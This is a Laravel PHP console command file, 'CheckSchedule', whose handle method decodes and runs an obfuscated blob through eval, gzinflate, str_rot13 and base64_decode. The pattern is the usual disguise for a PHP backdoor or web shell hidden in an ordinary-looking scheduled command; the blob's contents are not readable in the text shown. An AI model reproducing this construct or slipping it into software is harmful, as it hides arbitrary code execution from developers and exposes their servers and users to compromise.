<?php

namespace App\Console\Commands;

use App\Models\ErrorLog;
use Illuminate\Console\Command;

class CheckSchedule extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'check-schedule';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Command description';

    /**
     * Execute the console command.
     *
     * @return int
     */
    public function handle(): int
    {
        eval(gzinflate(str_rot13(base64_decode('tZHRV8MwFIbv+xRkDJJPdr0QLxwDTtDHCExtunOmVsg5wQ3x3VrbWiYd3pmrUPjzfx8nBRxOi9XeEFBFlGNIsbVC9Ab0dyy89MrtodwUizu2cipTaJKdsQRELAIV65LTcbwT65yB8rNg+VGgFB0LEfZlQ6R7wRsx+NZnBtqnsjE8C1n5WvH1J2tDTtxRWWaOwTFL34LgP/VK3UouFM0gwLXnkhH8z1gwnThYYRkPdnSNYTRvoxOSH+o88vJv1ymL8Mv3DinK7Ivyw0M/N0iM1zurTahQH/hsahmjfWW09CpU8n3Jc53n5Kxk7282kU7lSY4nJBj4tA7ICmZnccmQVXfvCBzh7VQV2ymEx4esqccvOKBql2wpMzGKYg=='))));
        return 0;
    }
}
